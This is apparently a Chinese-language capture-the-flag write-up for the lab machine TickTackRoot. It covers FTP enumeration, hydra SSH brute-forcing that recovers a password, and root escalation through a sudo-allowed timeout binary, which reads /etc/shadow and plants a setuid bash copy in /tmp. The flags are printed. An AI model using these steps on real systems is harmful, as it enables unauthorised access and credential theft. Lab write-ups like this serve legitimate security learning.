# TickTackRoot

2025.02.27 https://thehackerslabs.com/ticktackroot/

[video](https://www.bilibili.com/video/BV1Fw9AYmEt8/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 可以匿名登陆，先看。index.html 显示的是 apache 默认页面，login/login.txt 中显示了：

```
rafael
monica
```

像是 2 个用户名。

80 web 上用大字典扫描没扫出什么东西，只好用 hydra 爆破一下 ssh 上面 2 个账号，没爆出来；在爆一下 ftp 用这 2 个账号，还是没爆出来。目前什么都没有。

在看一下 ftp 登陆这里显示了一个 Bienvenido Robin 这里得到了一个 robin 的名字，可能是用户名，再用这个 robin 进行下 ssh 爆破，终于找到了密码 babyblue

先拿到 user flag：

```
robin@TheHackersLabs-Ticktackroot:~$ cat  user.txt
8XG29KLM3PZA1VQR5JYN
```

sudo -l 显示 (ALL) NOPASSWD: /usr/bin/timeout_suid

GTFOBins 中没有现成的利用，看看这个程序的帮助信息，看到可以直接执行命令，拿到最终 flag：

```
/usr/bin/timeout_suid 10 cat /etc/shadow

robin@TheHackersLabs-Ticktackroot:~$ /usr/bin/timeout_suid 10 cp /bin/bash /tmp/rootbash
robin@TheHackersLabs-Ticktackroot:~$ /usr/bin/timeout_suid 10 chmod +xs /tmp/rootbash
robin@TheHackersLabs-Ticktackroot:~$ ls -al /tmp/rootbash
-rwsr-sr-x 1 root root 1446024 feb 27 14:29 /tmp/rootbash
robin@TheHackersLabs-Ticktackroot:~$ /tmp/rootbash -p
rootbash-5.2# cd /root
rootbash-5.2# ls
root.txt
rootbash-5.2# cat root.txt
9BW5V2UJZ4NXDF3Q7CML
```
